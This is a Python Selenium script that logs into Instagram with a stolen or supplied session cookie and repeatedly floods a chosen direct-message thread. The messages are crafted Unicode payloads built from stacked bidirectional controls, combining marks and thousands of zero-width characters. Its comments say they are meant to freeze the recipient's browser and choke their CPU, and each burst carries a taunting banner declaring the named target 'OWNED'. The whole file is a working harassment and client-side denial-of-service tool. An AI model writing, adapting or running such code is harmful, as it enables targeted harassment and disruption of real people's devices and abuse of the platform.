# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER NC (VOID-DRAG OWNED EDITION)
# 📅 STATUS: NESTED RECURSION | DYNAMIC BRANDING | 10 AGENTS

import os, time, random, threading, sys, gc, tempfile, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options

# --- CONFIG ---
THREADS = 2
SESSION_LIMIT = 180 
MACHINE_ID = os.getenv("MACHINE_ID", "1")

def get_void_drag_payload(target_name):
    """The 'Void-Drag': Header-focused with maximum DOM destruction."""
    # This is the exact branding you requested
    header = f"👑 PRAVEER PAPA 👑 SYSTEM ERROR: {target_name.upper()} HAS BEEN OWNED\n"
    
    # 💥 THE 'RECURSION TRAP'
    # Forces 180 nested isolate layers to lock the browser main thread.
    nesting_trap = "\u2066\u2067\u2068" * 60 
    
    # 💥 THE 'VOID OVERRIDE'
    # Forces the engine to flip-flop LTR/RTL rendering.
    void_chaos = "\u202E\u202D\u200F\u200E" * 45
    
    # 💥 THE 'VERTICAL DRAG'
    z_drag = "̸" * 40 + "̽" * 40 + "̾" * 40
    
    # 💥 BUFFER BLOAT (Invisible memory pressure)
    bloat = "".join(random.choice(["\u200B", "\u200D", "\uFEFF"]) for _ in range(6000))
    
    lines = [header, nesting_trap]
    for i in range(50):
        # We use the target name as the base for the vertical skyscraper
        style = void_chaos if i % 2 == 0 else void_chaos[::-1]
        lines.append(f"{style} {target_name.upper()}_OWNED {z_drag}")
    
    lines.append(bloat + "\n🛑 KERNEL PANIC: MEM_LIMIT_EXCEEDED 🛑")
    return "\n".join(lines)[:9900] # Safe-limit for IG servers

def get_driver(agent_id):
    chrome_options = Options()
    chrome_options.add_argument("--headless=new")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--window-size=1920,1080")
    chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
    return webdriver.Chrome(options=chrome_options)

def run_life_cycle(agent_id, cookie, target_id, target_name):
    while True:
        driver = None
        try:
            print(f"[M{MACHINE_ID}-A{agent_id}] ⚡ DEPLOYING OWNED PAYLOAD...")
            driver = get_driver(agent_id)
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
            driver.refresh()
            time.sleep(5)
            driver.get(f"https://www.instagram.com/direct/t/{target_id}/")
            time.sleep(10)

            session_start = time.time()
            while (time.time() - session_start) < SESSION_LIMIT:
                try:
                    box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
                    
                    # 🔥 STAGGERED BURST: 3 Ultra-Heavy Messages 
                    for _ in range(3):
                        payload = get_void_drag_payload(target_name)
                        driver.execute_script("""
                            var el = arguments[0];
                            document.execCommand('insertText', false, arguments[1]);
                            el.dispatchEvent(new Event('input', { bubbles: true }));
                        """, box, payload)
                        box.send_keys(Keys.ENTER)
                        time.sleep(0.4) 
                    
                    print(f"[M{MACHINE_ID}-A{agent_id}] 💀 IMPACT DELIVERED | {target_name.upper()} IS GONE")
                    
                    # Pause to let the target's CPU choke on the rendering
                    time.sleep(random.uniform(12, 18)) 
                    
                except:
                    time.sleep(5)
                    break 
        except Exception: pass
        finally:
            if driver: driver.quit()
            gc.collect()
            time.sleep(3)

def main():
    cookie = os.environ.get("SESSION_ID", "").strip()
    target_id = os.environ.get("GROUP_URL", "").strip()
    target_name = os.environ.get("TARGET_NAME", "Target").strip()
    if not cookie or not target_id: sys.exit(1)
    
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for i in range(THREADS):
            executor.submit(run_life_cycle, i+1, cookie, target_id, target_name)

if __name__ == "__main__":
    main()
